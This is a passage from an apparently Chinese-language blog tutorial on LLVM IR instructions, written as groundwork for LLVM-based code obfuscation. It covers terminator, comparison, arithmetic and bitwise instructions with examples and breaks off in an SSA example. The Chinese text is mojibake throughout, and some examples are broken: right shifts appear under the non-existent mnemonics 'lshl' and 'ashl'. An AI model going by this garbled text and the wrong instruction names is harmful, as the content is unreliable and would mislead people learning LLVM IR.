alt="image-20230206232217964"></p><ul><li>å‡½æ•°æŒ‡çš„æ˜¯æºä»£ç ä¸­çš„<strong>æŸä¸ªå‡½æ•°</strong></li><li>å‚æ•°å³å‡½æ•°çš„<strong>å‚æ•°</strong></li><li>ä¸€ä¸ªå‡½æ•°ç”±è‹¥å¹²<strong>åŸºæœ¬å—</strong>ç»„æˆï¼Œå…¶ä¸­å‡½æ•°æœ€å…ˆæ‰§è¡Œçš„åŸºæœ¬å—ä¸º<strong>å…¥å£å—</strong></li></ul><h3 id="åŸºæœ¬å—"><a href="#åŸºæœ¬å—" class="headerlink" title="åŸºæœ¬å—"></a>åŸºæœ¬å—</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230206232337419.png" alt="image-20230206232337419"></p><ul><li>ä¸€ä¸ªåŸºæœ¬å—ç”±è‹¥å¹²æŒ‡ä»¤å’Œæ ‡ç­¾ç»„æˆ</li><li>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒåŸºæœ¬å—çš„æœ€åä¸€æ¡æŒ‡ä»¤ä¸ºè·³è½¬æŒ‡ä»¤(<strong>br</strong> æˆ– <strong>switch</strong>)ï¼Œæˆ–è¿”å›æŒ‡ä»¤(<strong>retn</strong>)ï¼Œä¹Ÿå«ä½œç»ˆç»“æŒ‡ä»¤(Terminator Instruction)</li><li>PHI æŒ‡ä»¤æ˜¯ä¸€ç§ç‰¹æ®Šçš„æŒ‡ä»¤</li></ul><h2 id="ä»£ç æ··æ·†"><a href="#ä»£ç æ··æ·†" class="headerlink" title="ä»£ç æ··æ·†"></a>ä»£ç æ··æ·†</h2><p>åŸºäº LLVM çš„æ··æ·†ï¼Œé€šå¸¸æ˜¯ä»¥å‡½æ•°æˆ–è€…æ¯”å‡½æ•°æ›´å°çš„å•ä½ä¸ºåŸºæœ¬å•ä½è¿›è¡Œæ··æ·†çš„ï¼Œæˆ‘ä»¬é€šå¸¸æ›´å…³å¿ƒå‡½æ•°å’ŒåŸºæœ¬å—è¿™ä¸¤ä¸ªç»“æ„</p><ul><li>ä»¥å‡½æ•°ä¸ºåŸºæœ¬å•ä½çš„æ··æ·†ï¼šæ§åˆ¶æµå¹³å¦åŒ–</li><li>ä»¥åŸºæœ¬å—åŸºæœ¬å•ä½çš„æ··æ·†ï¼šè™šå‡æ§åˆ¶æµ</li><li>ä»¥æŒ‡ä»¤ä¸ºåŸºæœ¬å•ä½çš„æ··æ·†ï¼šæŒ‡ä»¤æ›¿ä»£</li></ul><h1 id="LLVM-IR-å¸¸ç”¨æŒ‡ä»¤å«ä¹‰åŠå…¶ç”¨æ³•"><a href="#LLVM-IR-å¸¸ç”¨æŒ‡ä»¤å«ä¹‰åŠå…¶ç”¨æ³•" class="headerlink" title="LLVM IR å¸¸ç”¨æŒ‡ä»¤å«ä¹‰åŠå…¶ç”¨æ³•"></a>LLVM IR å¸¸ç”¨æŒ‡ä»¤å«ä¹‰åŠå…¶ç”¨æ³•</h1><h2 id="ç»ˆç»“æŒ‡ä»¤-Terminator-Instructions"><a href="#ç»ˆç»“æŒ‡ä»¤-Terminator-Instructions" class="headerlink" title="ç»ˆç»“æŒ‡ä»¤ Terminator Instructions"></a>ç»ˆç»“æŒ‡ä»¤ Terminator Instructions</h2><h3 id="ret-æŒ‡ä»¤"><a href="#ret-æŒ‡ä»¤" class="headerlink" title="ret æŒ‡ä»¤"></a>ret æŒ‡ä»¤</h3><ul><li>å‡½æ•°çš„è¿”å›æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„ return</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ret &lt;type&gt; &lt;value&gt;; è¿”å›ç‰¹å®šç±»å‹è¿”å›å€¼çš„ return æŒ‡ä»¤</span><br><span class="line">ret void; æ— è¿”å›å€¼çš„ return æŒ‡ä»¤</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">ret i32 5; è¿”å›æ•´æ•° 5</span><br><span class="line">ret void; æ— è¿”å›å€¼</span><br><span class="line">ret &#123; i32, i8 &#125; &#123; i32 4, i8 2 &#125;; è¿”å›ä¸€ä¸ªç»“æ„ä½“</span><br></pre></td></tr></table></figure><h3 id="br-æŒ‡ä»¤"><a href="#br-æŒ‡ä»¤" class="headerlink" title="br æŒ‡ä»¤"></a>br æŒ‡ä»¤</h3><ul><li>br æ˜¯â€åˆ†æ”¯â€çš„è‹±æ–‡ branch çš„ç¼©å†™ï¼Œåˆ†ä¸ºéæ¡ä»¶åˆ†æ”¯å’Œæ¡ä»¶åˆ†æ”¯ï¼Œå¯¹åº” C&#x2F;C++ çš„ if è¯­å¥</li><li>æ— æ¡ä»¶åˆ†æ”¯ç±»ä¼¼äºx86æ±‡ç¼–ä¸­çš„ jmp æŒ‡ä»¤ï¼Œæ¡ä»¶åˆ†æ”¯ç±»ä¼¼äºx86æ±‡ç¼–ä¸­çš„ jnz, je ç­‰æ¡ä»¶è·³è½¬æŒ‡ä»¤</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">br i1 &lt;cond&gt;, label &lt;iftrue&gt;, label &lt;iffalse&gt;; æ¡ä»¶åˆ†æ”¯ï¼Œi1 æ˜¯æ¡ä»¶ï¼Œ1 ä½æ•´æ•°</span><br><span class="line">br label &lt;dest&gt;; æ— æ¡ä»¶åˆ†æ”¯</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">Test:</span><br><span class="line">%cond = icmp eq i32 %a, %b;</span><br><span class="line">br i1 %cond, label %IfEqual, label %IfUnequal</span><br><span class="line">IfEqual:</span><br><span class="line">ret i32 1</span><br><span class="line">IfUnEqual:</span><br><span class="line">ret i32 0</span><br></pre></td></tr></table></figure><h3 id="swtich-æŒ‡ä»¤"><a href="#swtich-æŒ‡ä»¤" class="headerlink" title="swtich æŒ‡ä»¤"></a>swtich æŒ‡ä»¤</h3><ul><li>åˆ†æ”¯æŒ‡ä»¤ï¼Œå¯çœ‹åšæ˜¯ br æŒ‡ä»¤çš„å‡çº§ç‰ˆï¼Œæ”¯æŒçš„åˆ†æ”¯æ›´å¤šï¼Œä½†ä½¿ç”¨ä¹Ÿæ›´å¤æ‚ã€‚å¯¹åº” C&#x2F;C++ ä¸­çš„ switch</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">switch &lt;intty&gt; &lt;value&gt;, label &lt;defaultdest&gt; [ &lt;intty&gt; &lt;val&gt;, label &lt;dest&gt; ...]</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">; ä¸æ¡ä»¶è·³è½¬ç­‰æ•ˆ</span><br><span class="line">%Val = zext i1 %value to i32</span><br><span class="line">switch i32 %Val, label %truedest [ i32 0, label %falsedest ]</span><br><span class="line"></span><br><span class="line">; ä¸éæ¡ä»¶è·³è½¬ç­‰æ•ˆ</span><br><span class="line">switch i32 0, label %dest [ ]</span><br><span class="line"></span><br><span class="line">; æ‹¥æœ‰ä¸‰ä¸ªåˆ†æ”¯çš„æ¡ä»¶è·³è½¬</span><br><span class="line">switch i32 %val, label %otherwise [ i32 0, label %onzero</span><br><span class="line">i32 1, label %onone</span><br><span class="line">i32 2, label %ontwo ]</span><br></pre></td></tr></table></figure><h2 id="æ¯”è¾ƒæŒ‡ä»¤-Compere-Instructions"><a href="#æ¯”è¾ƒæŒ‡ä»¤-Compere-Instructions" class="headerlink" title="æ¯”è¾ƒæŒ‡ä»¤ Compere Instructions"></a>æ¯”è¾ƒæŒ‡ä»¤ Compere Instructions</h2><p>å¸¸ä¸ br æŒ‡ä»¤ä¸€èµ·ä½¿ç”¨ï¼Œå¦‚ï¼š<code>cmp</code>ã€<code>switch</code>ã€<code>test</code></p><h3 id="icmp-æŒ‡ä»¤"><a href="#icmp-æŒ‡ä»¤" class="headerlink" title="icmp æŒ‡ä»¤"></a>icmp æŒ‡ä»¤</h3><ul><li><strong>æ•´æ•°æˆ–æŒ‡é’ˆ</strong>çš„æ¯”è¾ƒæŒ‡ä»¤</li><li>æ¡ä»¶ cond å¯ä»¥æ˜¯ eqï¼ˆç›¸ç­‰ï¼‰ï¼Œneï¼ˆä¸ç›¸ç­‰ï¼‰ï¼Œugtï¼ˆæ— ç¬¦å·å¤§äºï¼‰ç­‰ç­‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = icmp &lt;cond&gt; &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; æ¯”è¾ƒæ•´æ•° op1 å’Œ op2 æ˜¯å¦æ»¡è¶³æ¡ä»¶ cond</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = icmp eq i32 4, 5; yields: result=false eq=equal(ç›¸ç­‰)</span><br><span class="line">&lt;result&gt; = icmp ne float* %X, %X; yields: result=false ne=not equal(ä¸ç›¸ç­‰)</span><br><span class="line">&lt;result&gt; = icmp ult i16 4, 5; yields: result=true ult=unsigned less than(æ— ç¬¦å·å°äº)</span><br><span class="line">&lt;result&gt; = icmp sgt i16 4, 5; yields: result=false sgt=signed greater than(æœ‰ç¬¦å·å¤§äº)</span><br><span class="line">&lt;result&gt; = icmp ule i16 -4, 5; yields: result=false ule=unsigned less or equal(æ— ç¬¦å·å°äºç­‰äº)</span><br><span class="line">&lt;result&gt; = icmp sge i16 4, 5; yields: result=false sge=signed greater or equal(æœ‰ç¬¦å·å¤§äºç­‰äº)</span><br></pre></td></tr></table></figure><h3 id="fcmp-æŒ‡ä»¤"><a href="#fcmp-æŒ‡ä»¤" class="headerlink" title="fcmp æŒ‡ä»¤"></a>fcmp æŒ‡ä»¤</h3><ul><li><strong>æµ®ç‚¹æ•°</strong>çš„æ¯”è¾ƒæŒ‡ä»¤</li><li>æ¡ä»¶ cond å¯ä»¥æ˜¯ oeqï¼ˆordered and equalï¼‰, ueqï¼ˆunordered or equalï¼‰, falseï¼ˆå¿…å®šä¸æˆç«‹ï¼‰ç­‰ç­‰</li><li>ordered çš„æ„æ€æ˜¯ï¼Œä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸èƒ½ä¸º <strong>NAN</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = fcmp &lt;cond&gt; &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; æ¯”è¾ƒæµ®ç‚¹æ•° op1 å’Œ op2 æ˜¯å¦æ»¡è¶³æ¡ä»¶ cond</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = fcmp oeq float 4.0, 5.0; yields: result = false</span><br><span class="line">&lt;result&gt; = fcmp one float 4.0, 5.0; yields: result = true</span><br><span class="line">&lt;result&gt; = fcmp olt float 4.0, 5.0; yields: result = true</span><br><span class="line">&lt;result&gt; = fcmp ueq double 1.0, 2.0; yields: result = false</span><br></pre></td></tr></table></figure><h2 id="äºŒå…ƒè¿ç®—-Binary-Operations"><a href="#äºŒå…ƒè¿ç®—-Binary-Operations" class="headerlink" title="äºŒå…ƒè¿ç®— Binary Operations"></a>äºŒå…ƒè¿ç®— Binary Operations</h2><h3 id="add-æŒ‡ä»¤"><a href="#add-æŒ‡ä»¤" class="headerlink" title="add æŒ‡ä»¤"></a>add æŒ‡ä»¤</h3><ul><li><strong>æ•´æ•°</strong>åŠ æ³•æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ+â€æ“ä½œç¬¦ï¼Œç±»ä¼¼x86æ±‡ç¼–ä¸­çš„ add æŒ‡ä»¤</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = add &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = add i32 4, %var; yields i32:result = 4 + %var</span><br></pre></td></tr></table></figure><h3 id="sub-æŒ‡ä»¤"><a href="#sub-æŒ‡ä»¤" class="headerlink" title="sub æŒ‡ä»¤"></a>sub æŒ‡ä»¤</h3><ul><li><strong>æ•´æ•°</strong>å‡æ³•æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ-â€æ“ä½œç¬¦ï¼Œç±»ä¼¼x86æ±‡ç¼–ä¸­çš„ sub æŒ‡ä»¤</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = sub &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = sub i32 4, %var; yields i32:result = 4 - %var</span><br><span class="line">&lt;result&gt; = sub i32 0, %var; yields i32:result = -%var</span><br></pre></td></tr></table></figure><h3 id="mul-æŒ‡ä»¤"><a href="#mul-æŒ‡ä»¤" class="headerlink" title="mul æŒ‡ä»¤"></a>mul æŒ‡ä»¤</h3><ul><li><strong>æ•´æ•°</strong>ä¹˜æ³•æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ*â€æ“ä½œç¬¦ï¼Œç±»ä¼¼x86æ±‡ç¼–ä¸­çš„ mul æŒ‡ä»¤</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = mul &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = mul i32 4, %var; yields i32:result = 4 * %var</span><br></pre></td></tr></table></figure><h3 id="udiv-æŒ‡ä»¤"><a href="#udiv-æŒ‡ä»¤" class="headerlink" title="udiv æŒ‡ä»¤"></a>udiv æŒ‡ä»¤</h3><ul><li><strong>æ— ç¬¦å·æ•´æ•°</strong>é™¤æ³•æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ&#x2F;â€æ“ä½œç¬¦ã€‚å¦‚æœå­˜åœ¨exactå…³é”®å­—ï¼Œä¸”op1ä¸æ˜¯op2çš„å€æ•°ï¼Œå°±ä¼šå‡ºç°é”™è¯¯</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = udiv &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">&lt;result&gt; = udiv exact &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = udiv i32 4, %var; yields i32:result = 4 / %var</span><br></pre></td></tr></table></figure><h3 id="sdiv-æŒ‡ä»¤"><a href="#sdiv-æŒ‡ä»¤" class="headerlink" title="sdiv æŒ‡ä»¤"></a>sdiv æŒ‡ä»¤</h3><ul><li><strong>æœ‰ç¬¦å·æ•´æ•°</strong>é™¤æ³•æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ&#x2F;â€æ“ä½œç¬¦</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = sdiv &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">&lt;result&gt; = sdiv exact &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = sdiv i32 4, %var; yields i32:result = 4 / %var</span><br></pre></td></tr></table></figure><h3 id="urem-æŒ‡ä»¤"><a href="#urem-æŒ‡ä»¤" class="headerlink" title="urem æŒ‡ä»¤"></a>urem æŒ‡ä»¤</h3><ul><li><strong>æ— ç¬¦å·æ•´æ•°</strong>å–ä½™æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ%â€æ“ä½œç¬¦</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = urem &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = urem i32 4, %var; yields i32:result = 4 % %var</span><br></pre></td></tr></table></figure><h3 id="srem-æŒ‡ä»¤"><a href="#srem-æŒ‡ä»¤" class="headerlink" title="srem æŒ‡ä»¤"></a>srem æŒ‡ä»¤</h3><ul><li><strong>æœ‰ç¬¦å·æ•´æ•°</strong>å–ä½™æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ%â€æ“ä½œç¬¦</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = srem &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = srem i32 4, %var; yields i32:result = 4 % %var</span><br></pre></td></tr></table></figure><h2 id="æŒ‰ä½äºŒå…ƒè¿ç®—-Bitwise-Binary-Operations"><a href="#æŒ‰ä½äºŒå…ƒè¿ç®—-Bitwise-Binary-Operations" class="headerlink" title="æŒ‰ä½äºŒå…ƒè¿ç®— Bitwise Binary Operations"></a>æŒ‰ä½äºŒå…ƒè¿ç®— Bitwise Binary Operations</h2><h3 id="shl-æŒ‡ä»¤"><a href="#shl-æŒ‡ä»¤" class="headerlink" title="shl æŒ‡ä»¤"></a>shl æŒ‡ä»¤</h3><ul><li><strong>æ•´æ•°</strong>å·¦ç§»æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ&lt;&lt;â€æ“ä½œç¬¦ï¼Œç±»ä¼¼x86æ±‡ç¼–ä¸­çš„ shl æŒ‡ä»¤</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = shl &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = shl i32 4, %var; yields i32:result 4 &lt;&lt; %var</span><br><span class="line">&lt;result&gt; = shl i32 4, 2; yields i32:result 16</span><br><span class="line">&lt;result&gt; = shl i32 1, 10; yields i32:result 1024</span><br><span class="line">&lt;result&gt; = shl i32 1, 32; undefined</span><br><span class="line">&lt;result&gt; = shl &lt;2 x i32&gt; &lt; i32 1, i32 1&gt;, &lt; i32 1, i32 2&gt;; yields: result = &lt;2 x i32&gt; &lt; i32 2, i32 4&gt;</span><br></pre></td></tr></table></figure><h3 id="lshl-æŒ‡ä»¤"><a href="#lshl-æŒ‡ä»¤" class="headerlink" title="lshl æŒ‡ä»¤"></a>lshl æŒ‡ä»¤</h3><ul><li>æ•´æ•°<strong>é€»è¾‘å³ç§»</strong>æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ&gt;&gt;â€æ“ä½œç¬¦ï¼Œå³ç§»æŒ‡å®šä½æ•°ååœ¨å·¦ä¾§è¡¥0</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = lshl &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = lshl i32 4, 1; yields i32:result 2</span><br><span class="line">&lt;result&gt; = lshl i32 4, 2; yields i32:result 1</span><br><span class="line">&lt;result&gt; = lshl i8 4, 3; yields i8:result 0</span><br><span class="line">&lt;result&gt; = lshl i8 -2, 1; yields i8:result 0x7F</span><br><span class="line">&lt;result&gt; = lshl i32 1, 32; underfined</span><br><span class="line">&lt;result&gt; = lshl &lt;2 x i32&gt; &lt; i32 -2, i32 4&gt;, &lt; i32 1, i32 2&gt;; yields: result = &lt;2 x i32&gt; &lt; i32 0x7FFFFFFF, i32 1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ashr-æŒ‡ä»¤"><a href="#ashr-æŒ‡ä»¤" class="headerlink" title="ashr æŒ‡ä»¤"></a>ashr æŒ‡ä»¤</h3><ul><li>æ•´æ•°<strong>ç®—æ•°å³ç§»</strong>æŒ‡ä»¤ï¼Œå³ç§»æŒ‡å®šä½æ•°ååœ¨å·¦ä¾§è¡¥<strong>ç¬¦å·ä½</strong>ï¼ˆè´Ÿæ•°çš„ç¬¦å·ä½ä¸º1ï¼Œæ­£æ•°çš„ç¬¦å·ä½ä¸º0ï¼‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = ashl &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = ashl i32 4, 1; yields i32:result 2</span><br><span class="line">&lt;result&gt; = ashl i32 4, 2; yields i32:result 1</span><br><span class="line">&lt;result&gt; = ashl i8 4, 3; yields i8:result 0</span><br><span class="line">&lt;result&gt; = ashl i8 -2, 1; yields i8:result -1</span><br><span class="line">&lt;result&gt; = ashl i32 1, 32; underfined</span><br><span class="line">&lt;result&gt; = ashl &lt;2 x i32&gt; &lt; i32 -2, i32 4&gt;, &lt; i32 1, i32 3&gt;; yields: result = &lt;2 x i32&gt; &lt; i32 -1, i32 0&gt;</span><br></pre></td></tr></table></figure><h3 id="and-æŒ‡ä»¤"><a href="#and-æŒ‡ä»¤" class="headerlink" title="and æŒ‡ä»¤"></a>and æŒ‡ä»¤</h3><ul><li><strong>æ•´æ•°</strong>æŒ‰ä½ä¸è¿ç®—æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ&amp;â€æ“ä½œç¬¦ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = and &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = and i32 4, %var; yields i32:result = 4 &amp; %var</span><br><span class="line">&lt;result&gt; = and i32 15, 40; yields i32:result = 8</span><br><span class="line">&lt;result&gt; = and i32 4, 8; yields i32:result = 0</span><br></pre></td></tr></table></figure><h3 id="or-æŒ‡ä»¤"><a href="#or-æŒ‡ä»¤" class="headerlink" title="or æŒ‡ä»¤"></a>or æŒ‡ä»¤</h3><ul><li><strong>æ•´æ•°</strong>æŒ‰ä½æˆ–è¿ç®—æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ|â€æ“ä½œç¬¦</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = or &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = or i32 4, %var; yields i32:result = 4 | %var</span><br><span class="line">&lt;result&gt; = or i32 15, 40; yields i32:result = 47</span><br><span class="line">&lt;result&gt; = or i32 4, 8; yields i32:result = 12</span><br></pre></td></tr></table></figure><h3 id="xor-æŒ‡ä»¤"><a href="#xor-æŒ‡ä»¤" class="headerlink" title="xor æŒ‡ä»¤"></a>xor æŒ‡ä»¤</h3><ul><li><strong>æ•´æ•°</strong>æŒ‰ä½å¼‚æˆ–è¿ç®—æŒ‡ä»¤ï¼Œå¯¹åº” C&#x2F;C++ ä¸­çš„â€œ^â€æ“ä½œç¬¦</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = xor &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">ä¾‹ï¼š</span><br><span class="line">&lt;result&gt; = xor i32 4, %var; yields i32:result = 4 ^ %var</span><br><span class="line">&lt;result&gt; = xor i32 15, 40; yields i32:result = 39</span><br><span class="line">&lt;result&gt; = xor i32 4, 8; yields i32:result = 12</span><br><span class="line">&lt;result&gt; = xor i32 %V, -1; yields i32:result = ~%V</span><br></pre></td></tr></table></figure><h2 id="å†…å­˜è®¿é—®å’Œå¯»å€æ“ä½œ-Memory-Access-and-Addressing-Operations"><a href="#å†…å­˜è®¿é—®å’Œå¯»å€æ“ä½œ-Memory-Access-and-Addressing-Operations" class="headerlink" title="å†…å­˜è®¿é—®å’Œå¯»å€æ“ä½œ Memory Access and Addressing Operations"></a>å†…å­˜è®¿é—®å’Œå¯»å€æ“ä½œ Memory Access and Addressing Operations</h2><h3 id="é™æ€å•èµ‹å€¼"><a href="#é™æ€å•èµ‹å€¼" class="headerlink" title="é™æ€å•èµ‹å€¼"></a>é™æ€å•èµ‹å€¼</h3><ul><li>åœ¨ç¼–è¯‘å™¨è®¾è®¡ä¸­ï¼Œé™æ€å•èµ‹å€¼ï¼ˆStatic Single Assignment, SSAï¼‰ï¼Œæ˜¯ IR çš„ä¸€ç§å±æ€§</li><li>SSA çš„ç‰¹ç‚¹æ˜¯ï¼š<strong>åœ¨ç¨‹åºä¸­ä¸€ä¸ªå˜é‡ä»…èƒ½æœ‰ä¸€æ¡èµ‹å€¼è¯­å¥</strong></li><li>LLVM IR æ­£æ˜¯åŸºäºé™æ€å•èµ‹å€¼åŸåˆ™è®¾è®¡çš„</li></ul><p>åœ¨ä¸‹é¢è¿™ä¸ªç¨‹åºæµç¨‹å›¾ä¸­ï¼Œå˜é‡ x, y, w éƒ½è¢«èµ‹å€¼äº†ä¸¤æ¬¡ï¼Œä¸æ»¡è¶³ SSA</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230207034908128.png" alt="image-20230207034908128"></p><p>åœ¨ä¸‹é¢è¿™ä¸ªç¨‹åºæµç¨‹å›¾ä¸­ï¼Œæ‰€æœ‰å˜é‡éƒ½åªè¢«èµ‹å€¼äº†ä¸€æ¬¡ï¼Œæ»¡è¶³ SSA</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230207034927020.png" alt="image-20230207034927020"></p><h3 id="ç”±-SSA-å¼•èµ·çš„é—®é¢˜"><a href="#ç”±-SSA-å¼•èµ·çš„é—®é¢˜" class="headerlink" title="ç”± SSA å¼•èµ·çš„é—®é¢˜"></a>ç”± SSA å¼•èµ·çš„é—®é¢˜</h3><p>å‡è®¾ C++ ä¹Ÿæ˜¯åŸºäºé™æ€å•èµ‹å€¼åŸåˆ™çš„ï¼ˆå³ä¸€ä¸ªå˜é‡åªèƒ½è¢«èµ‹å€¼ä¸€æ¬¡ï¼‰ï¼Œè¦æ€æ ·ä¿®æ”¹è¿™ä¸ª for å¾ªç¯ï¼Œä½¿å…¶ç¬¦åˆ SSA åŸåˆ™ï¼Ÿ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span 